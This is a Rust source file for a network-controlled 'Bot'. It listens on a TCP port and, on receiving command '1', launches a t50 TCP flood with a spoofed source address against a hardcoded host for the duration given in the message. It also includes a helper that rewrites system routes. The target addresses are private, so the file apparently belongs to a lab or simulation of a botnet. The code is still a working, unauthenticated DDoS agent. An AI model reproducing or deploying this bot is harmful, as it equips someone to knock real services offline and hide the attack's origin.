#![allow(dead_code)]
use std::io::prelude::*;
use std::net::{TcpStream, TcpListener};
use std::process::Command;

pub trait Device {
    fn set_routes(&self, hosts: Vec<String>) {
        let router = &hosts[0];

        for peer in hosts[1..].iter() {
            Command::new("ip")
                .args(&["route", "add", peer, "via", router, "dev", "eth0"])
                .output()
                .expect("Failed to add route");
        }
    }
}

pub trait Publisher: Device {
    fn main_loop(&mut self) {
        loop {
            self.loop_callback();
        }
    }

    fn loop_callback(&mut self);
}

pub trait Subscriber: Device {
    fn main_loop(&self);
    fn loop_callback(&self, stream: TcpStream);
}

pub struct Bot {
    port: String,
}

impl Bot {
    pub fn new(port: String) -> Bot {
        Bot { port: port }
    }

    pub fn main_loop(&self) {
        let listener = TcpListener::bind("0.0.0.0:".to_string() + &self.port)
            .expect("Failed to establish socket");

        for stream in listener.incoming() {
            self.loop_callback(stream.unwrap());
        }
    }

    fn loop_callback(&self, mut stream: TcpStream) {
        let mut buffer = [0; 128];
        let n = stream.read(&mut buffer);
        match n {
            Ok(msg_len) => {
                let msg = String::from_utf8_lossy(&buffer[..msg_len]);
                println!(
                    "Message received: {:?}",
                    msg
                );
                let mut parts = msg
                    .split_whitespace();
                let cmd: String = parts.next().unwrap().to_string();
                if cmd == "1" {
                    let duration: String = parts.next().unwrap().to_string();
                    println!("Beggining attack");
                    let cmd_handle = Command::new("timeout")
                        .args(&[&duration, "t50","172.20.0.2", "--flood", "-p", "tcp", "-s", "172.18.0.7"])
                        .output()
                        .expect("failed to run t50");
                    println!("{}", String::from_utf8(cmd_handle.stdout).unwrap());
                }
            }
            Err(error) => println!("Error encountered: {}", error),
        }; 
    }
}

#[cfg(test)]
mod tests {}
